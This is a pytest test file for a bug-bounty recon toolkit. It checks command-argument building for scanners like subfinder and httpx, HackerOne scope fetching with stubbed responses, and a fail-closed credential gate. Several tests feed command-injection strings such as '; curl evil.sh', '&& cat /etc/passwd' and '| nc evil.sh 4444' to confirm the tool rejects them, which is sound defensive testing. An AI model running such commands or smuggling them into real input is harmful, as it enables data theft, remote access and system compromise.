"""Tests for the full-spectrum hunter toolset + HackerOne direct fetch.

Offline discipline: adapter argv is exercised against the live registry, the
H1 fetch layer is tested against recorded payload shapes with a stubbed
transport, and the ``bounty hunt`` wiring is validated up to (not including)
the live network call by asserting the fail-closed credential gate.
"""

from __future__ import annotations

import json

import pytest

from rebel_profiler.execution.broker import ActionRequest, AdapterRegistry
from rebel_profiler.intel.h1_fetch import ScopeRow, resolve_credentials


# ---------------------------------------------------------------- adapters

def _argv(name: str, target: str, params: dict | None = None) -> list[str]:
    registry = AdapterRegistry()
    adapter = registry.get(name)
    assert adapter is not None, f"adapter '{name}' not registered"
    request = ActionRequest(
        case_id="c", capability=adapter.capability_class, action=name,
        target=target, params=params or {}, requested_by="test")
    return adapter.build_argv(request)


class TestHunterAdapters:
    def test_all_five_registered(self):
        names = set(AdapterRegistry().names())
        assert {"subfinder-enum", "httpx-probe", "katana-crawl",
                "known-urls", "param-hunt"} <= names

    def test_subfinder_argv(self):
        argv = _argv("subfinder-enum", "example.test")
        assert argv[0] == "subfinder" and "-d" in argv
        assert "example.test" in argv and "-silent" in argv

    def test_subfinder_rejects_bad_domain(self):
        with pytest.raises(Exception):
            _argv("subfinder-enum", "not a domain; rm -rf")

    def test_httpx_argv_json_mode(self):
        argv = _argv("httpx-probe", "example.test:8443")
        # Kali names the ProjectDiscovery binary httpx-toolkit; upstream
        # ships plain httpx. Either is a correct resolution — the contract
        # is the argv shape, not which package the box happens to carry.
        assert argv[0] in ("httpx-toolkit", "httpx") and "-json" in argv
        assert "example.test:8443" in argv

    def test_katana_depth_is_capped(self):
        from rebel_profiler.core.errors import UsageError

        # the whitelist regex allows depth 1-5 only — 9 is a UsageError
        with pytest.raises(UsageError):
            _argv("katana-crawl", "https://example.test/", {"depth": "9"})

    def test_katana_rejects_out_of_range_depth(self):
        from rebel_profiler.core.errors import UsageError

        with pytest.raises(UsageError):
            _argv("katana-crawl", "https://example.test/", {"depth": "0"})

    def test_gau_argv(self):
        argv = _argv("known-urls", "example.test")
        assert argv[0] == "gau" and "--subs" in argv

    def test_arjun_stdout_output(self):
        argv = _argv("param-hunt", "https://example.test/api")
        assert argv[0] == "arjun"
        i = argv.index("-oT")
        assert argv[i + 1] == "-"     # stdout, never a file path

    def test_every_adapter_refuses_shell_metacharacters(self):
        from rebel_profiler.core.errors import UsageError

        for name, target in (
            ("subfinder-enum", "example.test; curl evil.sh"),
            ("httpx-probe", "example.test && cat /etc/passwd"),
            ("known-urls", "example.test | nc evil.sh 4444"),
        ):
            with pytest.raises(UsageError):
                _argv(name, target)


# ---------------------------------------------------------------- H1 fetch

class _FakeResponse:
    def __init__(self, payload: dict):
        self._payload = payload

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def read(self) -> bytes:
        return json.dumps(self._payload).encode()


class TestH1Fetch:
    def test_scope_row_shape(self):
        row = ScopeRow("api.example.test", "URL", True, "no scanning").as_row()
        assert row["asset_identifier"] == "api.example.test"
        assert row["eligible_for_submission"] is True

    def test_resolve_credentials_from_env(self, monkeypatch):
        monkeypatch.setenv("H1_API_USERNAME", "rebel")
        monkeypatch.setenv("H1_API_TOKEN", "tok-123")
        assert resolve_credentials() == ("rebel", "tok-123")

    def test_resolve_credentials_missing_is_none(self, monkeypatch):
        monkeypatch.delenv("H1_API_USERNAME", raising=False)
        monkeypatch.delenv("H1_API_TOKEN", raising=False)
        assert resolve_credentials({}) is None

    def test_resolve_credentials_half_configured_raises(self):
        with pytest.raises(ValueError) as exc:
            resolve_credentials({"H1_API_USERNAME": "rebel"})
        assert "token" in str(exc.value)

    def test_fetch_program_document_normalizes(self, monkeypatch):
        from rebel_profiler.intel import h1_fetch

        program_payload = {
            "data": {"attributes": {"handle": "examplecorp",
                                    "name": "Example Corp"}}}
        scopes_payload = {"data": [
            {"attributes": {"asset_identifier": "examplecorp.com",
                            "asset_type": "URL",
                            "eligible_for_submission": True,
                            "instruction": ""}},
            {"attributes": {"asset_identifier": "blog.examplecorp.com",
                            "asset_type": "URL",
                            "eligible_for_submission": False,
                            "instruction": "excluded"}},
            {"attributes": {"asset_identifier": "github.com/examplecorp",
                            "asset_type": "SOURCE_CODE",
                            "eligible_for_submission": True,
                            "instruction": ""}},
        ]}

        def fake_get(url, auth):
            if "/structured_scopes" in url:
                assert "page[number]=1" in url
                return scopes_payload
            return program_payload

        monkeypatch.setattr(h1_fetch, "_get", fake_get)
        doc = h1_fetch.fetch_program_document("examplecorp", "id", "tok")
        assert doc["program_name"] == "Example Corp"
        assert len(doc["includes"]) == 1
        assert doc["includes"][0]["value"] == "examplecorp.com"
        assert any(e["value"] == "blog.examplecorp.com"
                   for e in doc["excludes"])
        assert any("SOURCE_CODE" in s["reason"] or "source" in s["reason"].lower()
                   for s in doc["skipped"])


# ---------------------------------------------------------------- CLI gate

class TestBountyHuntGate:
    def test_hunt_fails_closed_without_credentials(self, tmp_path, monkeypatch,
                                                   capsys):
        # main() converts UsageError into exit code 2 + a structured stderr
        # message; the contract under test is the fail-closed gate itself.
        from rebel_profiler.cli.main import main

        monkeypatch.setenv("H1_API_USERNAME", "")
        monkeypatch.setenv("H1_API_TOKEN", "")
        monkeypatch.chdir(tmp_path)
        rc = main(["bounty", "hunt", "examplecorp",
                   "--data-dir", str(tmp_path)])
        assert rc == 2
        captured = capsys.readouterr()
        combined = (captured.out + captured.err).lower()
        assert "credential" in combined
        assert "h1_api_username" in combined or "credential store" in combined

    def test_hunt_with_stored_scope_skips_credential_gate(self, tmp_path,
                                                          monkeypatch, capsys):
        # A case whose scope is already in the ledger carries its
        # authorization on disk — `bounty hunt --case <id>` must run from
        # that stored scope without demanding H1 credentials (a fresh case
        # still fails closed; that contract is the test above).
        from rebel_profiler.cli.main import main

        monkeypatch.setenv("H1_API_USERNAME", "")
        monkeypatch.setenv("H1_API_TOKEN", "")
        monkeypatch.setenv("RP_MASTER_SECRET", "test-secret")
        monkeypatch.chdir(tmp_path)
        assert main(["case", "create", "Stored scope case", "--data-dir",
                     str(tmp_path)]) == 0
        listing = capsys.readouterr()
        assert main(["case", "list", "-o", "json", "--data-dir",
                     str(tmp_path)]) == 0
        import json as _json

        cases = _json.loads(capsys.readouterr().out)
        rows = cases if isinstance(cases, list) else cases.get("data", cases)
        case_id = rows[0]["id"]
        assert main(["case", "scope", "add", case_id, "*.lab.example.test",
                     "--note", "imported scope", "--data-dir",
                     str(tmp_path)]) == 0
        assert main(["bounty", "hunt", "examplecorp", "--case", case_id,
                     "--no-author", "--max-assets", "1", "--max-pages", "1",
                     "--data-dir", str(tmp_path)]) in (0, 1)
        # the run got past the credential gate (any terminal state is fine;
        # a credential error is not)
        captured = capsys.readouterr()
        combined = (captured.out + captured.err).lower()
        assert "no hackerone api credentials" not in combined
